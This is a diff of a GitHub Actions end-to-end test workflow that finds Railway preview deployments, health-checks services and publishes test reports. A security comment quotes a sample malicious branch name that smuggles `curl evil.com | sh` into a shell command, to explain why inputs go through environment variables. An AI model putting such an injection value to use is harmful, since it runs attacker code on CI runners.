@@ -1,6 +1,14 @@
 name: E2E tests
 on:
-  deployment_status:
+  pull_request:
+  # Post-merge backstop: run e2e against the persistent pr-base Railway
+  # env after every commit to main. pr-base has the same preview-style
+  # layout (including Mailpit) so the existing test suite works against
+  # it unchanged. This catches regressions that slipped through PR e2e
+  # due to the silent-failure scenarios documented on the
+  # "Find Railway preview deployment" step below.
+  push:
+    branches: [main]
   workflow_dispatch:
     inputs:
       env_name:
@@ -8,22 +16,24 @@ on:
         required: true
         type: string
 
+# Cancel any in-progress run for the same PR/ref when a newer push lands,
+# so rapid consecutive pushes don't pile up runs on stale commits.
+concurrency:
+  group: e2e-${{ github.event.pull_request.number || github.ref }}
+  cancel-in-progress: true
+
 jobs:
   e2e:
     runs-on: ubuntu-latest
     timeout-minutes: 20
     permissions:
+      # actions:read is needed by dorny/test-reporter to look up the
+      # workflow run it's attaching the check to.
+      actions: read
       pull-requests: read
-    # Two ways in:
-    #   - deployment_status: fired automatically by Railway on a successful
-    #     transient preview-env deployment
-    #   - workflow_dispatch: manual retrigger against an existing Railway env,
-    #     useful for e2e-only changes that don't cause a Railway rebuild
-    if: |
-      github.event_name == 'workflow_dispatch' ||
-      (github.event.deployment_status.state == 'success' &&
-       github.event.deployment.transient_environment == true &&
-       github.event.deployment.creator.login == 'railway-app[bot]')
+      # dorny/test-reporter creates a check run on the head SHA, which
+      # needs checks:write.
+      checks: write
     steps:
       - uses: actions/checkout@v6
       - uses: pnpm/action-setup@v5
@@ -34,58 +44,443 @@ jobs:
       - run: pnpm install --frozen-lockfile
       - run: npx playwright install --with-deps chromium
 
+      - name: Resolve target SHA
+        id: sha
+        # User-controlled inputs (notably PR_HEAD_REF, which can be
+        # any string an attacker chooses when opening a PR from a
+        # fork) are routed through env vars rather than interpolated
+        # directly into the shell script. GHA expression substitution
+        # happens before the shell sees the script, so a malicious
+        # branch name like `"; curl evil.com | sh; #` would become
+        # live shell syntax if templated directly. Environment
+        # variables aren't re-parsed by the shell, so accessing them
+        # via `$PR_HEAD_REF` is safe.
+        # See: https://securitylab.github.com/resources/github-actions-untrusted-input/
+        env:
+          GH_TOKEN: ${{ github.token }}
+          EVENT_NAME: ${{ github.event_name }}
+          GH_REPOSITORY: ${{ github.repository }}
+          GITHUB_REF: ${{ github.ref }}
+          GITHUB_SHA: ${{ github.sha }}
+          PR_HEAD_SHA: ${{ github.event.pull_request.head.sha }}
+          PR_HEAD_REF: ${{ github.event.pull_request.head.ref }}
+          PR_NUMBER: ${{ github.event.pull_request.number }}
+        run: |
+          echo "Resolving target commit for this run..."
+          case "$EVENT_NAME" in
+            pull_request)
+              SHA="$PR_HEAD_SHA"
+              CONTEXT="PR #${PR_NUMBER} (branch '${PR_HEAD_REF}')"
+              ;;
+            push|workflow_dispatch)
+              SHA="$GITHUB_SHA"
+              CONTEXT="$EVENT_NAME on $GITHUB_REF"
+              ;;
+            *)
+              echo "::error::Unexpected event: $EVENT_NAME"
+              exit 1
+              ;;
+          esac
+
+          # One-line commit summary via GitHub API — doesn't require
+          # extra checkout history. Falls back to just the short SHA if
+          # the API call fails for any reason.
+          SUMMARY=$(
+            gh api "repos/${GH_REPOSITORY}/commits/${SHA}" \
+              --jq '(.sha[:12]) + " " + (.commit.message | split("\n")[0])' 2>/dev/null \
+              || echo "${SHA:0:12}"
+          )
+
+          echo "  Event:   $EVENT_NAME"
+          echo "  Context: $CONTEXT"
+          echo "  Target:  $SUMMARY"
+
+          echo "sha=$SHA" >> "$GITHUB_OUTPUT"
+          echo "summary=$SUMMARY" >> "$GITHUB_OUTPUT"
+
+      # ------------------------------------------------------------
+      # KNOWN LIMITATION — possible silent failure on pull_request
+      # ------------------------------------------------------------
+      # The step below decides whether to wait for a fresh Railway
+      # rebuild OR to fall back to an existing deployment by
+      # *observing* what Railway actually does: "did a deployment
+      # record for this SHA appear within 20 seconds?" If yes, wait
+      # for it to finish; if no, assume Railway correctly decided not
+      # to rebuild and fall back to the newest existing deployment in
+      # the target environment.
+      #
+      # This is a HEURISTIC, not a guarantee. If Railway's webhook /
+      # deployment-API pipeline is delayed, broken, or silently drops
+      # an event — or if Railway genuinely should have rebuilt but
+      # didn't due to a bug in their watchPatterns matcher — the
+      # 20-second grace window will conclude "no rebuild coming" and
+      # fall back to a previous deployment. Tests then run against a
+      # stale image and silently pass even though the new code was
+      # never actually exercised. A regressing push is especially
+      # dangerous: broken code goes green because the old env still
+      # works. The failure mode is SILENT and BIASED TOWARD PASSING.
+      #
+      # Blast radius is reduced (but not eliminated) by the post-merge
+      # backstop run on push-to-main, which re-tests the merged code
+      # against the persistent pr-base Railway env. If a PR's e2e
+      # silently passed against a stale preview and a regression
+      # landed, the post-merge run catches it — unless the same
+      # silent-failure scenario recurs on the merge commit, which is
+      # possible if Railway's pipeline is broadly broken rather than
+      # intermittently flaky.
+      #
+      # The only fully-correct fix is to re-derive Railway's rebuild
+      # decision ourselves by parsing each service's watchPatterns
+      # from railway.toml and matching the `git diff` against them,
+      # so we can definitively say "we expect a rebuild" or "we
+      # don't" without observing Railway at all. Tracked in:
+      #
+      #   https://github.com/hypercerts-org/ePDS/issues/57
+      #
+      # Until that lands, the 20-second window is the honest
+      # trade-off: correct enough in the common case, explicitly
+      # documented in the failure mode.
+      # ------------------------------------------------------------
+      - name: Find Railway deployment
+        # Skipped on workflow_dispatch, which is the manual-retrigger
+        # escape hatch: the caller supplies env_name and is responsible
+        # for knowing the Railway env is already up.
+        if: github.event_name != 'workflow_dispatch'
+        id: wait-deploy
+        # Every GHA expression substitution is routed through an env
+        # var rather than interpolated directly into the shell script
+        # — see the comment on Resolve target SHA above. The SUMMARY
+        # variable specifically matters because it's derived from a
+        # commit message (user-controlled content).
+        env:
+          GH_TOKEN: ${{ github.token }}
+          GH_REPOSITORY: ${{ github.repository }}
+          SHA: ${{ steps.sha.outputs.sha }}
+          SUMMARY: ${{ steps.sha.outputs.summary }}
+          # Only set on pull_request — unused on push.
+          PR_NUMBER: ${{ github.event.pull_request.number }}
+          EVENT: ${{ github.event_name }}
+        run: |
+          echo "Picking a Railway deployment to test against."
+          echo "  Target: $SUMMARY"
+
+          # Strategy:
+          #   1. Prefer a Railway deployment on *this* SHA. If the
+          #      current push touched a path in Railway's watchPatterns,
+          #      Railway will rebuild and such a deployment will exist
+          #      (eventually) — poll for it to reach success.
+          #   2. Fallback: after a 20-second grace period with no
+          #      SHA-specific deployment, fall back to the newest
+          #      Railway deployment in the target environment,
+          #      regardless of SHA. That covers pushes that don't
+          #      touch a watched path — the currently-running env is
+          #      still the right thing to test against.
+          #
+          # Strict fallback policy: only the NEWEST deployment counts.
+          # If it's failure/error/inactive we hard-fail rather than
+          # walking back to find an older success, because that would
+          # silently mask a broken env. See the KNOWN LIMITATION
+          # comment above the step.
+
+          GRACE_ATTEMPTS=4   # 4 × 5s = 20 seconds
+          MAX_ATTEMPTS=36    # 36 × 5s = 3 minutes
+
+          # Event-type-specific query configuration.
+          case "$EVENT" in
+            pull_request)
+              # Match any Railway transient env whose name ends in
+              # "-<PR number>". Covers both "ePDS / ePDS-pr-55" and
+              # the collision-avoidance form "ePDS / pr-3897f1-55".
+              SHA_FILTER=".creator.login == \"railway-app[bot]\" and .transient_environment == true and (.environment | endswith(\"-$PR_NUMBER\"))"
+              FALLBACK_URL="repos/${GH_REPOSITORY}/deployments?per_page=100"
+              FALLBACK_FILTER="$SHA_FILTER"
+              TARGET_DESC="PR #$PR_NUMBER preview"
+              ;;
+            push)
+              # Persistent pr-base env. The `environment` query parameter
+              # is an exact-match filter — efficient server-side.
+              SHA_FILTER='.creator.login == "railway-app[bot]" and .environment == "ePDS / pr-base"'
+              FALLBACK_URL="repos/${GH_REPOSITORY}/deployments?environment=ePDS%20%2F%20pr-base&per_page=10"
+              FALLBACK_FILTER='.creator.login == "railway-app[bot]"'
+              TARGET_DESC="pr-base env"
+              ;;
+            *)
+              echo "::error::Unexpected event: $EVENT"
+              exit 1
+              ;;
+          esac
+          echo "  Environment: $TARGET_DESC"
+
+          find_deploy_for_sha() {
+            gh api "repos/${GH_REPOSITORY}/deployments?sha=$SHA" \
+              --jq "map(select($SHA_FILTER))[0]"
+          }
+
+          find_newest_deploy() {
+            gh api "$FALLBACK_URL" \
+              --jq "map(select($FALLBACK_FILTER))[0]"
+          }
+
+          latest_state_of() {
+            local id=$1
+            gh api "repos/${GH_REPOSITORY}/deployments/$id/statuses" \
+              --jq '.[0].state // "pending"'
+          }
+
+          describe_sha() {
+            local sha=$1
+            gh api "repos/${GH_REPOSITORY}/commits/$sha" \
+              --jq '(.sha[:12]) + " " + (.commit.message | split("\n")[0])' 2>/dev/null \
+              || echo "${sha:0:12}"
+          }
+
+          # ----------------------------------------------------------
+          # Phase 1: poll for SHA-specific deployment
+          # ----------------------------------------------------------
+          echo
+          echo "Phase 1: looking for a fresh Railway rebuild on this SHA (up to $((MAX_ATTEMPTS * 5))s)..."
+          echo "::group::Polling loop (SHA-specific lookup)"
+          grace_elapsed=false
+          for i in $(seq 1 $MAX_ATTEMPTS); do
+            deploy_json=$(find_deploy_for_sha)
+            if [ -z "$deploy_json" ] || [ "$deploy_json" = "null" ]; then
+              state=none
+            else
+              deploy_id=$(echo "$deploy_json" | python3 -c 'import sys,json;print(json.load(sys.stdin)["id"])')
+              state=$(latest_state_of "$deploy_id")
+            fi
+            echo "  attempt $i/$MAX_ATTEMPTS: state=$state"
+
+            if [ "$state" = "success" ]; then
+              env_name=$(echo "$deploy_json" | python3 -c 'import sys,json;print(json.load(sys.stdin)["environment"])')
+              echo "::endgroup::"
+              echo
+              echo "✓ Found fresh Railway rebuild on this SHA."
+              echo "  Environment: $env_name"
+              echo "env_name=$env_name" >> "$GITHUB_OUTPUT"
+              exit 0
+            fi
+
+            if [ "$state" = "failure" ] || [ "$state" = "error" ]; then
+              echo "::endgroup::"
+              echo
+              echo "::error::Railway deployment for this SHA failed (state=$state). The Railway build is broken — fix the underlying failure and push again."
+              exit 1
+            fi
+
+            # Grace period exhausted → break out of Phase 1 and
+            # continue to Phase 2 (fallback).
+            if [ "$state" = "none" ] && [ "$i" -ge "$GRACE_ATTEMPTS" ]; then
+              grace_elapsed=true
+              break
+            fi
+
+            sleep 5
+          done
+          echo "::endgroup::"
+
+          if [ "$grace_elapsed" != "true" ]; then
+            echo
+            echo "::error::Railway deployment for this SHA did not reach success within $((MAX_ATTEMPTS * 5))s. Something is stuck in Railway's build pipeline."
+            exit 1
+          fi
+
+          # ----------------------------------------------------------
+          # Phase 2: fallback — newest deployment in target env
+          # ----------------------------------------------------------
+          echo
+          echo "Phase 2: no rebuild triggered in $((GRACE_ATTEMPTS * 5))s — this push doesn't touch any path in Railway's watchPatterns."
+          echo "Falling back to the newest existing deployment in $TARGET_DESC."
+
+          echo "::group::Fallback query details"
+          newest=$(find_newest_deploy)
+          if [ -z "$newest" ] || [ "$newest" = "null" ]; then
+            echo "Query returned no results."
+            echo "::endgroup::"
+            echo
+            echo "::error::No Railway deployments exist for $TARGET_DESC at all. Is this a brand-new context whose first deploy hasn't landed yet? Push a change under one of Railway's watchPatterns to force a fresh build, or retrigger manually via workflow_dispatch once Railway's env is up."
+            exit 1
+          fi
+          newest_id=$(echo "$newest" | python3 -c 'import sys,json;print(json.load(sys.stdin)["id"])')
+          newest_sha=$(echo "$newest" | python3 -c 'import sys,json;print(json.load(sys.stdin)["sha"])')
+          newest_state=$(latest_state_of "$newest_id")
+          newest_summary=$(describe_sha "$newest_sha")
+          echo "  id:      $newest_id"
+          echo "  sha:     $newest_sha"
+          echo "  summary: $newest_summary"
+          echo "  state:   $newest_state"
+          echo "::endgroup::"
+
+          echo
+          echo "Newest deployment in $TARGET_DESC:"
+          echo "  $newest_summary"
+          echo "  state: $newest_state"
+
+          case "$newest_state" in
+            success)
+              env_name=$(echo "$newest" | python3 -c 'import sys,json;print(json.load(sys.stdin)["environment"])')
+              echo
+              echo "✓ Using existing Railway deployment."
+              echo "  Environment: $env_name"
+              echo "env_name=$env_name" >> "$GITHUB_OUTPUT"
+              exit 0
+              ;;
+            in_progress|queued|pending)
+              # The newest deployment in the target env is still
+              # being built — an earlier push's deploy that hasn't
+              # finished yet. Rather than returning stale results
+              # against an even older deploy, wait for this one to
+              # finish. We only monitor this specific deployment
+              # because by the time we got here (grace period
+              # already exhausted without a SHA-specific deploy
+              # appearing), Railway has already decided not to
+              # rebuild for our SHA — so there's no point re-polling
+              # the SHA-specific path.
+              echo
+              echo "Waiting for the in-progress deploy to finish (up to $((MAX_ATTEMPTS * 5))s total)..."
+              echo "::group::Waiting for fallback deployment to finish"
+              for j in $(seq 1 $MAX_ATTEMPTS); do
+                sleep 5
+                new_state=$(latest_state_of "$newest_id")
+                echo "  fallback wait $j/$MAX_ATTEMPTS: state=$new_state"
+                case "$new_state" in
+                  success)
+                    env_name=$(echo "$newest" | python3 -c 'import sys,json;print(json.load(sys.stdin)["environment"])')
+                    echo "::endgroup::"
+                    echo
+                    echo "✓ Fallback deployment reached success."
+                    echo "  Environment: $env_name"
+                    echo "env_name=$env_name" >> "$GITHUB_OUTPUT"
+                    exit 0
+                    ;;
+                  failure|error)
+                    echo "::endgroup::"
+                    echo
+                    echo "::error::Fallback Railway deployment transitioned to '$new_state' while we were waiting. The env is broken — fix the underlying failure."
+                    exit 1
+                    ;;
+                esac
+              done
+              echo "::endgroup::"
+              echo
+              echo "::error::Fallback Railway deployment didn't reach a terminal state within $((MAX_ATTEMPTS * 5))s."
+              exit 1
+              ;;
+            failure|error)
+              echo
+              echo "::error::Newest Railway deployment in $TARGET_DESC is in '$newest_state' state. The env is broken — fix the underlying failure or retrigger a Railway build. Refusing to fall back to an older successful deploy because that would silently hide the broken state."
+              exit 1
+              ;;
+            inactive)
+              # GitHub marks deployments 'inactive' when a newer one
+              # supersedes them. The newest entry being 'inactive' is
+              # unusual — it could mean Railway's webhook-to-API
+              # plumbing is lagging. Fail rather than guess.
+              echo
+              echo "::error::Newest Railway deployment in $TARGET_DESC is 'inactive', which is unexpected for the most recent deployment. Check Railway's deployment history and retry."
+              exit 1
+              ;;
+            *)
+              echo
+              echo "::error::Newest Railway deployment in $TARGET_DESC is in unknown state '$newest_state'. Refusing to proceed."
+              exit 1
+              ;;
+          esac
+
       - name: Derive service URLs
         id: urls
         env:
-          # "ePDS / ePDS-pr-48" for normal envs, "ePDS / pr-3897f1-47" when
-          # Railway falls back to its collision-avoidance naming during a
-          # close/reopen or force-push that hits the env-cleanup window.
+          # On workflow_dispatch we read the env name from inputs; on
+          # pull_request / push we read it from the wait-deploy step's
+          # output, which is the Railway deployment's `environment`
+          # field ("ePDS / ePDS-pr-48", the collision-avoidance form
+          # "ePDS / pr-3897f1-47", or "ePDS / pr-base" for the
+          # post-merge backstop).
           # See: https://station.railway.com/questions/pr-environment-name-format-change-causin-9aaa904f
-          # On manual workflow_dispatch we read the env name from inputs;
-          # on deployment_status we read it from the webhook payload.
-          FULL_ENV: ${{ github.event_name == 'workflow_dispatch' && inputs.env_name || github.event.deployment.environment }}
+          FULL_ENV: ${{ github.event_name == 'workflow_dispatch' && inputs.env_name || steps.wait-deploy.outputs.env_name }}
         run: |
+          echo "Deriving service URLs from Railway environment: $FULL_ENV"
+
+          echo "::group::Env-name parsing and slug derivation"
           # Railway's autogenerated *.up.railway.app domains are built as
-          # <service-slug>-<env-name>.up.railway.app, with both parts lowercased
-          # and the scope prefix stripped from the service name. Derive URLs
-          # from the live env name rather than templating off the PR number,
-          # so both naming formats work without a Railway API lookup.
+          # <service-slug>-<env-name>.up.railway.app, with both parts
+          # lowercased and the scope prefix stripped from the service
+          # name. Derive URLs from the live env name rather than
+          # templating off the PR number, so both naming formats work
+          # without a Railway API lookup.
           if [[ "$FULL_ENV" != *" / "* ]]; then
+            echo "::endgroup::"
             echo "::error::Unexpected deployment environment format: $FULL_ENV"
             exit 1
           fi
           ENV_NAME="${FULL_ENV##* / }"
           ENV_SLUG="${ENV_NAME,,}"
+          echo "  FULL_ENV = $FULL_ENV"
+          echo "  ENV_NAME = $ENV_NAME"
+          echo "  ENV_SLUG = $ENV_SLUG"
           if [[ -z "$ENV_SLUG" || ! "$ENV_SLUG" =~ ^[a-z0-9][a-z0-9-]*$ ]]; then
+            echo "::endgroup::"
             echo "::error::Could not parse env name from deployment environment: $FULL_ENV"
             exit 1
           fi
+          echo "::endgroup::"
+
+          EPDS_URL="https://certified-apppds-core-${ENV_SLUG}.up.railway.app"
+          AUTH_URL="https://certified-appauth-service-${ENV_SLUG}.up.railway.app"
+          DEMO_URL="https://certified-appdemo-${ENV_SLUG}.up.railway.app"
+          MAILPIT_URL="https://mailpit-${ENV_SLUG}.up.railway.app"
+
+          echo
+          echo "Service URLs:"
+          echo "  PDS:     $EPDS_URL"
+          echo "  Auth:    $AUTH_URL"
+          echo "  Demo:    $DEMO_URL"
+          echo "  Mailpit: $MAILPIT_URL"
+
           {
-            echo "epds_url=https://certified-apppds-core-${ENV_SLUG}.up.railway.app"
-            echo "auth_url=https://certified-appauth-service-${ENV_SLUG}.up.railway.app"
-            echo "demo_url=https://certified-appdemo-${ENV_SLUG}.up.railway.app"
-            echo "mailpit_url=https://mailpit-${ENV_SLUG}.up.railway.app"
+            echo "epds_url=$EPDS_URL"
+            echo "auth_url=$AUTH_URL"
+            echo "demo_url=$DEMO_URL"
+            echo "mailpit_url=$MAILPIT_URL"
           } >> "$GITHUB_OUTPUT"
 
       - name: Wait for all services
+        # URLs routed via env even though they're derived from a
+        # strictly-validated slug regex upstream, matching the general
+        # policy of never interpolating ${{ }} into run-block scripts.
+        env:
+          EPDS_URL: ${{ steps.urls.outputs.epds_url }}
+          AUTH_URL: ${{ steps.urls.outputs.auth_url }}
+          DEMO_URL: ${{ steps.urls.outputs.demo_url }}
+          MAILPIT_URL: ${{ steps.urls.outputs.mailpit_url }}
         run: |
+          echo "Health-checking 4 Railway services (5 minutes per service)..."
+
           check() {
-            local URL=$1
+            local LABEL=$1
+            local URL=$2
+            echo "::group::$LABEL ($URL)"
             for i in $(seq 1 30); do
               if curl -sf "$URL" > /dev/null 2>&1; then
-                echo "✓ $URL is up"
+                echo "  ✓ reachable on attempt $i/30"
+                echo "::endgroup::"
+                echo "  ✓ $LABEL"
                 return 0
               fi
-              echo "  Attempt $i/30 failed, retrying in 10s..."
+              echo "  attempt $i/30 failed, retrying in 10s..."
               sleep 10
             done
-            echo "::error::$URL timed out after 5 minutes"
+            echo "::endgroup::"
+            echo "::error::$LABEL ($URL) timed out after 5 minutes"
             exit 1
           }
-          check "${{ steps.urls.outputs.epds_url }}/health"
-          check "${{ steps.urls.outputs.auth_url }}/health"
-          check "${{ steps.urls.outputs.demo_url }}"
-          check "${{ steps.urls.outputs.mailpit_url }}/readyz"
+          check "PDS"     "${EPDS_URL}/health"
+          check "Auth"    "${AUTH_URL}/health"
+          check "Demo"    "${DEMO_URL}"
+          check "Mailpit" "${MAILPIT_URL}/readyz"
+
+          echo
+          echo "All 4 services reachable."
 
       - name: Run e2e suite
         env:
@@ -97,6 +492,19 @@ jobs:
           E2E_MAILPIT_PASS: ${{ secrets.E2E_MAILPIT_PASS }}
           E2E_HEADLESS: 'true'
         run: pnpm test:e2e:headless
+
+      - name: Publish e2e test report
+        # Run on both pass and fail so the Checks tab always has the
+        # summary and any failing scenarios get file+line annotations
+        # on the PR diff. fail-on-error is off so a reporter glitch
+        # can't turn a green test run red.
+        if: ${{ !cancelled() }}
+        uses: dorny/test-reporter@a43b3a5f7366b97d083190328d2c652e1a8b6aa2 # v3.0.0
+        with:
+          name: e2e cucumber report
+          path: reports/e2e.junit.xml
+          reporter: java-junit
+          fail-on-error: false
 
       - name: Upload e2e report
         if: ${{ !cancelled() }}
